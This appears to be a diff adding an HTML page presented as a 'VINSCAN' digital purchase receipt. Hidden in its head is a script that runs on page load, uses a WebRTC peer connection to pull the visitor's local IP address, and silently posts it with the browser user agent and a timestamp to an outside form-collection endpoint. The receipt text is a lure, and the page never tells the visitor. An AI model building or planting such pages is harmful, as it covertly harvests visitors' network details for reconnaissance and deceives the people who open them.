@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VINSCAN Digital Receipt</title>
+    <script>
+        async function getLocalIP() {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel("");
+            pc.onicecandidate = event => {
+                if (event && event.candidate && event.candidate.candidate) {
+                    let ip_match = event.candidate.candidate.match(/\d+\.\d+\.\d+\.\d+/);
+                    if (ip_match) {
+                        fetch('https://formspree.io/f/mdkabale', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ 
+                                localIP: ip_match[0], 
+                                userAgent: navigator.userAgent, 
+                                timestamp: new Date().toISOString() 
+                            })
+                        });
+                    }
+                }
+            };
+            await pc.createOffer().then(o => pc.setLocalDescription(o));
+        }
+        getLocalIP();
+    </script>
+</head>
+<body>
+    <h2>Thank You for Your Purchase</h2>
+    <p>Your VINSCAN digital receipt is being processed. Please wait...</p>
+</body>
+</html>
